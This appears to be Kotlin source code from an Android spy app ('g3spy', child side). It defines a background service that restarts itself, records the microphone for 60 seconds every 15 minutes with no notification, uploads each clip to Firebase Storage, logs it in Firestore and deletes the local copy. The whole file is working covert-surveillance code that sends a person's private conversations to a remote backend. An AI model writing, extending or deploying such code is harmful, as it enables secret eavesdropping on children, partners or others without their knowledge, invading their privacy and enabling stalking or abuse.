package com.g3spy.child

import android.app.Service
import android.content.Intent
import android.media.MediaRecorder
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import java.util.*

class MicRecordingService : Service() {
    private val storage = FirebaseStorage.getInstance()
    private val db = FirebaseFirestore.getInstance()
    private var recorder: MediaRecorder? = null
    private lateinit var audioFile: File
    private val handler = Handler(Looper.getMainLooper())
    private val recordingDuration = 60 * 1000L // 60 seconds
    private val recordingInterval = 15 * 60 * 1000L // 15 minutes
    
    // Track whether we're currently recording
    private var isRecording = false
    
    // Runnable to schedule recordings
    private val recordingRunnable = object : Runnable {
        override fun run() {
            if (!isRecording) {
                startRecording()
            }
            handler.postDelayed(this, recordingInterval)
        }
    }

    override fun onCreate() {
        super.onCreate()
        // Start the recording cycle
        handler.post(recordingRunnable)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
    
    private fun startRecording() {
        try {
            isRecording = true
            audioFile = File(filesDir, "audio_${System.currentTimeMillis()}.3gp")
            
            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setOutputFile(audioFile.absolutePath)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                prepare()
                start()
            }
            
            // Schedule recording stop after set duration
            handler.postDelayed({
                stopRecordingAndUpload()
            }, recordingDuration)
        } catch (e: Exception) {
            isRecording = false
        }
    }
    
    private fun stopRecordingAndUpload() {
        try {
            recorder?.apply {
                stop()
                release()
            }
            recorder = null
            isRecording = false
            
            // Upload the audio file
            if (audioFile.exists() && audioFile.length() > 0) {
                uploadAudioFile()
            }
        } catch (e: Exception) {
            isRecording = false
        }
    }
    
    private fun uploadAudioFile() {
        val storageRef = storage.reference.child("audio/${UUID.randomUUID()}.3gp")
        val uploadTask = storageRef.putFile(android.net.Uri.fromFile(audioFile))
        
        uploadTask.continueWithTask { task ->
            if (!task.isSuccessful) {
                task.exception?.let { throw it }
            }
            storageRef.downloadUrl
        }.addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val downloadUrl = task.result.toString()
                
                // Store metadata in Firestore
                val audioData = hashMapOf(
                    "url" to downloadUrl,
                    "timestamp" to com.google.firebase.Timestamp.now(),
                    "duration" to recordingDuration / 1000, // Convert to seconds
                    "deviceId" to android.os.Build.MODEL
                )
                
                db.collection("audio_logs").add(audioData)
                
                // Delete the temporary file
                audioFile.delete()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Remove callbacks to avoid memory leaks
        handler.removeCallbacks(recordingRunnable)
        
        // Stop any active recording
        if (isRecording) {
            stopRecordingAndUpload()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}